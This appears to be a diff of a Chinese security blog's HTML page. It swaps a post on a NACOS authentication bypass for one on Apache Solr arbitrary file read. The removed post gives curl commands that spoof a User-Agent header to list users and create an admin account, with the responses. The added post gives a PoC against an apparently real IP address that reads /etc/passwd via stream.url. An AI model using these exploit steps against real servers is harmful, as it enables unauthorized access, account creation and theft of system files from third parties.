@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>NACOS身份认证绕过漏洞 | GMF信息小站</title>
+    <title>Apache Solr 任意文件读取漏洞 | GMF信息小站</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1616048116786.css">
+<link rel="stylesheet" href="/css/style.css?v=1616048116741.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2021/01/18/NACOS%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2021/01/18/NACOS%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,23 +105,17 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>NACOS身份认证绕过漏洞</span></h3>
+        <h3 class="post-title"><span>Apache Solr 任意文件读取漏洞</span></h3>
     </header>
     <p class="post-meta text-center">
         givemefivw 发表于
-        <time datetime="2021-01-18T07:06:16.000Z">2021-01-18</time>
+        <time datetime="2021-03-18T06:11:29.000Z">2021-03-18</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由于不当处理User-Agent字段导致在nacos开启了鉴权后，依然能绕过鉴权访问任何http接口</p>
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1、访问用户列表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl XGET &#39;http:&#x2F;&#x2F;127.0.0.1:8848&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9&#39; -H &#39;User-Agent: Nacos-Server&#39;</span><br></pre></td></tr></table></figure>
-<p>Response:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;totalCount&quot;: 1,</span><br><span class="line">    &quot;pageNumber&quot;: 1,</span><br><span class="line">    &quot;pagesAvailable&quot;: 1,</span><br><span class="line">    &quot;pageItems&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;username&quot;: &quot;nacos&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>2、添加新用户并再次查看用户列表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST &#39;http:&#x2F;&#x2F;127.0.0.1:8848&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?username&#x3D;test&amp;password&#x3D;test&#39; -H &#39;User-Agent: Nacos-Server&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl XGET &#39;http:&#x2F;&#x2F;127.0.0.1:8848&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9&#39; -H &#39;User-Agent: Nacos-Server&#39;</span><br></pre></td></tr></table></figure>
-<p>Response:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;totalCount&quot;: 2,</span><br><span class="line">    &quot;pageNumber&quot;: 1,</span><br><span class="line">    &quot;pagesAvailable&quot;: 1,</span><br><span class="line">    &quot;pageItems&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;username&quot;: &quot;nacos&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;username&quot;: &quot;test&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;nacos&#x2F;issues&#x2F;4593</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.seebug.org&#x2F;vuldb&#x2F;ssvid-99096</span><br></pre></td></tr></table></figure>
+        <h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;37.143.8.54:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br><span class="line"></span><br><span class="line">找到name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;37.143.8.54:8983&#x2F;solr&#x2F;ivtextil&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/1.png"></p>
+<p><img src="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/2.png"></p>
+
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
@@ -132,7 +126,7 @@
             标签：
             
     
-        <a href="/tags/POC/" title="POC">POC</a>
+        <a href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现</a>
     
 
         </span>
@@ -158,20 +152,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/01/22/Xray-bat%E5%B0%8F%E8%84%9A%E6%9C%AC/">
-            
-                Xray bat小脚本
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2021/01/16/CVE-2020-14882-CVE-2020-14883-Weblogic-Http-Console%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+        <a href="/2021/03/12/%E8%AE%BA%E5%AD%A6%E7%94%9F%E4%B8%8E%E5%AD%A6%E6%A0%A1/">
             
-                CVE-2020-14882&amp;CVE-2020-14883 Weblogic Http Console权限绕过&amp;命令执行
+                论学生与学校
             
         </a>
     </span>
@@ -349,7 +339,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1616048116790.js"></script>
+<script src="/js/main.js?v=1616048116745.js"></script>
 
 
 </body>
